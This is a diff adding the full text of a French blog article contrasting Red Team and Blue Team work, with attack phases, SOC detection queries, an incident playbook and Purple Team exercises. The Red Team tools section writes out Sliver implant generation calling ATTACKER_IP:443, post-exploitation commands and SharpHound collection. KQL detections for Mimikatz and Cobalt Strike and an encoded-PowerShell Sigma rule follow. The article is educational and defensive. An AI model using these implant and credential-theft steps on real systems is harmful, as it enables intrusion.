@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Red Team vs Blue Team : les deux faces de la cybersécurité — Temgus.CyberBlog</title>
 <meta name="description" content="Opérations offensives vs défensives, Purple Team et comment les deux se renforcent mutuellement.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/red-team-blue-team.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/red-team-blue-team.html">
 <meta property="og:title" content="Red Team vs Blue Team : les deux faces de la cybersécurité — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Red Team vs Blue Team : les deux faces de la cybersécurité — Temgus.CyberBlog">
 <meta name="twitter:description" content="Opérations offensives vs défensives, Purple Team et comment les deux se renforcent mutuellement.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,534 @@
   "headline": "Red Team vs Blue Team : les deux faces de la cybersécurité",
   "description": "Opérations offensives vs défensives, Purple Team et comment les deux se renforcent mutuellement.",
   "datePublished": "2025-05-11",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/red-team-blue-team.html",
   "inLanguage": "fr",
   "keywords": "red team, blue team, SOC, purple team",
-  "timeRequired": "PT12M"
+  "timeRequired": "PT12M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">⚔️</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Red Team vs Blue Team : les deux faces de la cybersécurité</h1>
-  <p style="color:#8892a4;max-width:500px">Opérations offensives vs défensives, Purple Team et comment les deux se renforcent mutuellement.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#red-team-blue-team" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">⚔️</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Red Team vs Blue Team : les deux faces de la cybersécurité</div>
+      <div class="meta-details">
+        <span>📅 2025-05-11</span>
+        <span>⏱ 12 min de lecture</span>
+        <span>🏷 Avancé</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#red-team-les-attaquants-thiques">Red Team : les attaquants éthiques</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#qu-est-ce-que-le-red-team-">Qu'est-ce que le Red Team ?</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#les-phases-d-une-op-ration-red-team">Les phases d'une opération Red Team</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#outils-red-team">Outils Red Team</a></li>
+<li><a href="#blue-team-les-d-fenseurs">Blue Team : les défenseurs</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#les-composantes-du-blue-team">Les composantes du Blue Team</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#siem-et-d-tection">SIEM et détection</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#playbooks-de-r-ponse-aux-incidents">Playbooks de réponse aux incidents</a></li>
+<li><a href="#playbook-compte-compromis">Playbook : Compte compromis</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#d-tection">Détection</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#triage-15-minutes-">Triage (15 minutes)</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#confinement-30-minutes-">Confinement (30 minutes)</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#investigation-2-4-heures-">Investigation (2-4 heures)</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#eradication">Eradication</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#recovery">Recovery</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#le-ons-apprises">Leçons apprises</a></li>
+<li><a href="#purple-team-la-collaboration">Purple Team : la collaboration</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#mitre-att-ck-pour-le-purple-team">MITRE ATT&CK pour le Purple Team</a></li>
+<li><a href="#carri-res-red-team-vs-blue-team">Carrières Red Team vs Blue Team</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Red Team vs Blue Team : les deux faces de la cybersécurité</h1>
+
+<p>La cybersécurité se joue comme une partie d'échecs entre attaquants et défenseurs. Le <strong>Red Team</strong> simule les attaquants réels, le <strong>Blue Team</strong> défend l'organisation. Comprendre ces deux rôles est essentiel pour construire une posture de sécurité efficace.</p>
+
+<h2 id="red-team-les-attaquants-thiques">Red Team : les attaquants éthiques</h2>
+
+<h3 id="qu-est-ce-que-le-red-team-">Qu'est-ce que le Red Team ?</h3>
+
+<pre><code>Pentest classique vs Red Team :
+
+<p>Pentest :</p>
+<p>→ Périmètre défini et limité</p>
+<p>→ Durée : quelques jours à 2 semaines</p>
+<p>→ Objectif : trouver des vulnérabilités techniques</p>
+<p>→ L'équipe sécurité sait qu'un test a lieu</p>
+
+<p>Red Team :</p>
+<p>→ Simulation d'une vraie attaque (APT)</p>
+<p>→ Durée : plusieurs semaines à mois</p>
+<p>→ Objectif : atteindre un objectif business (ex: "accéder aux données RH")</p>
+<p>→ Seule la direction sait → Le Blue Team ne sait pas</p>
+<p>→ Teste TOUTE la chaîne : technique + humain + physique</code></pre>
+
+<h3 id="les-phases-d-une-op-ration-red-team">Les phases d'une opération Red Team</h3>
+
+<pre><code>PHASE 1 : Reconnaissance (2-4 semaines)
+<p>→ OSINT sur l'entreprise (LinkedIn, job offers, GitHub)</p>
+<p>→ Cartographie infrastructure (DNS, IPs, technologies)</p>
+<p>→ Identification des employés clés (IT, finance, direction)</p>
+<p>→ Recherche de credentials leakés (Have I Been Pwned, Dehashed)</p>
+
+<p>PHASE 2 : Accès initial (1-2 semaines)</p>
+<p>→ Phishing ciblé (spear phishing)</p>
+<p>→ Exploitation de vulnérabilités externes (VPN, Exchange, serveurs web)</p>
+<p>→ Attaque physique (badge cloning, tailgating)</p>
+<p>→ Watering hole (compromission de sites visités par les employés)</p>
+
+<p>PHASE 3 : Établissement du foothold (quelques jours)</p>
+<p>→ Installation d'un implant persistent (Cobalt Strike, Sliver, Havoc)</p>
+<p>→ Établissement de canaux C2 (Command &amp; Control) discrets</p>
+<p>→ Anti-forensics basique (pas de logs bruyants)</p>
+
+<p>PHASE 4 : Mouvement latéral (1-3 semaines)</p>
+<p>→ Énumération interne (BloodHound, ADExplorer)</p>
+<p>→ Vol de credentials (Mimikatz, LSASS dump)</p>
+<p>→ Pivoting vers d'autres segments réseau</p>
+<p>→ Compromission progressive vers l'objectif</p>
+
+<p>PHASE 5 : Atteinte de l'objectif</p>
+<p>→ Exfiltration de données cibles</p>
+<p>→ Accès aux systèmes critiques</p>
+<p>→ Preuve de compromission (screenshots, fichiers)</p>
+
+<p>PHASE 6 : Rapport et debriefing</p>
+<p>→ Rapport technique détaillé</p>
+<p>→ Rapport exécutif (impact business)</p>
+<p>→ Purple Team : partage avec le Blue Team</code></pre>
+
+<h3 id="outils-red-team">Outils Red Team</h3>
+
+<pre><code class="language-bash"># C2 Framework - Cobalt Strike (standard industrie, payant)
+<h1>Alternatives open source :</h1>
+<p>→ Sliver  : https://github.com/BishopFox/sliver</p>
+<p>→ Havoc   : https://github.com/HavocFramework/Havoc</p>
+<p>→ Covenant: https://github.com/cobbr/Covenant</p>
+
+<h1>Implant Sliver basique</h1>
+<h1>Générer un implant</h1>
+<p>sliver &gt; generate --http ATTACKER_IP:443 --os windows --arch amd64 --name implant</p>
+
+<h1>Listener HTTPS</h1>
+<p>sliver &gt; https --lport 443</p>
+
+<h1>Post-exploitation</h1>
+<p>sliver (implant) &gt; info          # Infos système</p>
+<p>sliver (implant) &gt; ps            # Processus</p>
+<p>sliver (implant) &gt; upload        # Upload de fichiers</p>
+<p>sliver (implant) &gt; execute       # Exécuter commandes</p>
+<p>sliver (implant) &gt; socks5 start  # Pivot SOCKS5</p>
+
+<h1>Reconnaissance AD avec BloodHound</h1>
+<p>SharpHound.exe -c All --outputdirectory C:\Temp</p>
+<h1>Analyser dans BloodHound UI → trouver les chemins vers Domain Admin</code></pre></h1>
+
+<h2 id="blue-team-les-d-fenseurs">Blue Team : les défenseurs</h2>
+
+<h3 id="les-composantes-du-blue-team">Les composantes du Blue Team</h3>
+
+<pre><code>SOC (Security Operations Center) :
+<p>→ Surveillance 24/7 des alertes et événements</p>
+<p>→ Triage et investigation des incidents</p>
+<p>→ Niveau 1 (triage) → Niveau 2 (investigation) → Niveau 3 (forensics)</p>
+
+<p>DFIR (Digital Forensics &amp; Incident Response) :</p>
+<p>→ Réponse aux incidents actifs</p>
+<p>→ Analyse forensique post-incident</p>
+<p>→ Éradication des attaquants</p>
+
+<p>Threat Intelligence :</p>
+<p>→ Veille sur les menaces émergentes</p>
+<p>→ IoCs (Indicators of Compromise)</p>
+<p>→ Profiling des groupes APT</p>
+
+<p>Vulnerability Management :</p>
+<p>→ Scan régulier des vulnérabilités</p>
+<p>→ Priorisation et suivi des corrections</p>
+<p>→ Patch management</code></pre>
+
+<h3 id="siem-et-d-tection">SIEM et détection</h3>
+
+<pre><code class="language-python"># KQL (Kusto Query Language) - Microsoft Sentinel
+
+<h1>Détecter les tentatives de pass-the-hash</h1>
+<p>SecurityEvent</p>
+<p>| where EventID == 4624</p>
+<p>| where LogonType == 3  // Network logon</p>
+<p>| where AuthenticationPackageName == "NTLM"</p>
+<p>| where WorkstationName != ""</p>
+<p>| summarize count() by Account, IpAddress, bin(TimeGenerated, 1h)</p>
+<p>| where count_ &gt; 10</p>
+<p>| order by count_ desc</p>
+
+<h1>Détecter l'utilisation de Mimikatz</h1>
+<p>SecurityEvent</p>
+<p>| where EventID == 10  // Sysmon - ProcessAccess</p>
+<p>| where TargetImage endswith "lsass.exe"</p>
+<p>| where GrantedAccess has_any ("0x1010", "0x1410", "0x147a", "0x1038")</p>
+<p>| project TimeGenerated, Computer, SourceImage, TargetImage, GrantedAccess</p>
+
+<h1>Détecter les connexions Cobalt Strike (beacon)</h1>
+<p>CommonSecurityLog</p>
+<p>| where DeviceVendor == "Palo Alto Networks"</p>
+<p>| where DeviceAction == "allow"</p>
+<p>| where DestinationPort in (80, 443, 8080, 8443)</p>
+<p>| summarize BytesSent=sum(SentBytes), RequestCount=count() by DestinationIP, bin(TimeGenerated, 1h)</p>
+<p>| where RequestCount between (10..50)  // Beaconing régulier suspect</p>
+<p>| where BytesSent &lt; 1000  // Petites requêtes régulières</code></pre>
+
+<h3 id="playbooks-de-r-ponse-aux-incidents">Playbooks de réponse aux incidents</h3>
+
+<pre><code class="language-markdown">## Playbook : Compte compromis
+
+<h3 id="d-tection">Détection</h3>
+<p>Alerte : Connexion depuis pays inhabituel OU</p>
+<p>Connexion à des heures anormales OU</p>
+<p>Spray de mots de passe détecté</p>
+
+<h3 id="triage-15-minutes-">Triage (15 minutes)</h3>
+<li>Identifier le compte affecté</li>
+<li>Vérifier les activités récentes (EventID 4624, 4625)</li>
+<li>Chercher des connexions simultanées de pays différents</li>
+<li>Vérifier les emails envoyés dans les dernières 24h</li>
+
+<h3 id="confinement-30-minutes-">Confinement (30 minutes)</h3>
+<p>□ Désactiver le compte AD immédiatement</p>
+<p>□ Révoquer toutes les sessions actives (Azure AD → Revoke sessions)</p>
+<p>□ Changer le mot de passe</p>
+<p>□ Désactiver tous les tokens OAuth/API</p>
+
+<h3 id="investigation-2-4-heures-">Investigation (2-4 heures)</h3>
+<p>□ Timeline des activités depuis la compromission</p>
+<p>□ Données accédées / exfiltrées ?</p>
+<p>□ Persistance installée ?</p>
+<p>□ Mouvement latéral depuis ce compte ?</p>
+<p>□ Comment le compte a été compromis ?</p>
+
+<h3 id="eradication">Eradication</h3>
+<p>□ Supprimer toute persistance identifiée</p>
+<p>□ Analyser les autres comptes potentiellement compromis</p>
+
+<h3 id="recovery">Recovery</h3>
+<p>□ Réactiver le compte après sécurisation</p>
+<p>□ Informer l'utilisateur + formation phishing</p>
+
+<h3 id="le-ons-apprises">Leçons apprises</h3>
+<p>□ Rapport d'incident</p>
+<p>□ Amélioration des contrôles (MFA, conditional access)</code></pre>
+
+<h2 id="purple-team-la-collaboration">Purple Team : la collaboration</h2>
+
+<pre><code>Purple Team = Red Team + Blue Team qui travaillent ENSEMBLE
+
+<p>Approche traditionnelle (silotée) :</p>
+<p>Red Team attaque → Rapport → Blue Team corrige</p>
+<p>Problème : délai, pas d'apprentissage en temps réel</p>
+
+<p>Purple Team (collaborative) :</p>
+<p>Red Team technique → Blue Team observe → Amélioration immédiate</p>
+<p>Red lance une technique → Blue : "On l'a détecté ?" → Ajuster les détections</p>
+
+<p>Bénéfices :</p>
+<p>→ Détections créées/améliorées en temps réel</p>
+<p>→ Blue Team comprend mieux les techniques d'attaque</p>
+<p>→ Red Team comprend mieux les capacités de détection</p>
+<p>→ ROI bien meilleur qu'un Red Team classique</code></pre>
+
+<h3 id="mitre-att-ck-pour-le-purple-team">MITRE ATT&CK pour le Purple Team</h3>
+
+<pre><code class="language-python"># Utiliser ATT&amp;CK pour structurer les exercices Purple Team
+
+<p>exercice_purple = {</p>
+<p>"technique": "T1059.001",</p>
+<p>"nom": "PowerShell",</p>
+<p>"test_red": "powershell.exe -EncodedCommand [base64]",</p>
+<p>"detection_attendue": "Event ID 4104 + pattern base64",</p>
+<p>"regle_sigma": """</p>
+<p>title: Suspicious PowerShell Encoded Command</p>
+<p>detection:</p>
+<p>selection:</p>
+<p>EventID: 4104</p>
+<p>ScriptBlockText|contains: '-EncodedCommand'</p>
+<p>condition: selection</p>
+<p>""",</p>
+<p>"resultat": "DÉTECTÉ" # ou "NON DÉTECTÉ → créer la règle"</p>
+<p>}</p>
+
+<h1>Atomic Red Team - Tests ATT&amp;CK automatisés</h1>
+<h1>https://github.com/redcanaryco/atomic-red-team</h1>
+<h1>Invoke-AtomicTest T1059.001 -TestNumbers 1</code></pre></h1>
+
+<h2 id="carri-res-red-team-vs-blue-team">Carrières Red Team vs Blue Team</h2>
+
+<pre><code>Red Team :
+<p>Rôles : Pentester, Red Team Operator, Exploit Developer</p>
+<p>Certifications : OSCP, CRTO, OSED, OSEP</p>
+<p>Salaire France : 45-90k€/an</p>
+<p>Profil : curieux, créatif, persistence, pensée latérale</p>
+
+<p>Blue Team :</p>
+<p>Rôles : SOC Analyst, Incident Responder, Threat Hunter, DFIR</p>
+<p>Certifications : BlueTeamLabs, GCIH, GCFE, GREM</p>
+<p>Salaire France : 40-80k€/an</p>
+<p>Profil : analytique, méthodique, résistance au stress, communication</p>
+
+<p>Purple Team :</p>
+<p>Rôles : Detection Engineer, Security Engineer</p>
+<p>Nécessite : compréhension des deux côtés</p>
+<p>Salaire France : 55-100k€/an</p>
+<p>Profil : le plus complet, le plus demandé en 2024</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Red et Blue Team sont deux faces indissociables d'une cybersécurité efficace. Sans Red Team, le Blue Team ne sait pas contre quoi il se défend. Sans Blue Team, le Red Team n'a aucun impact. Le <strong>Purple Team</strong> représente l'avenir : attaque et défense qui s'informent mutuellement pour construire des organisations réellement résilientes.</p></article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#red-team-blue-team" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/oscp-preparation.html" class="nav-prev">← OSCP : préparer et réussir la certification</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/phishing-kit-anatomie.html" class="nav-next">Anatomie d'un phishing kit : comment fonctionnent les arnaques →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
